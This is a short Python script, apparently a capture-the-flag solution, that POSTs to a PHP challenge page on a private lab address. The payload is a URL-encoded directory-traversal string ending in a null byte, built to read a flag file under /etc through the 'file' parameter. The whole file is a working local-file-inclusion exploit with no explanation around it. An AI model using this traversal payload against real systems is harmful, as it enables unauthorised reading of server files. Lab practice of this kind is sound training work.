import requests

url = "http://10.10.87.195/challenges/chall3.php?file=welcome"

payload='file=..%2F..%2F..%2F..%2Fetc%2Fflag3%00'
headers = {
  'Content-Type': 'application/x-www-form-urlencoded'
}

response = requests.request("POST", url, headers=headers, data=payload)

print(response.text)
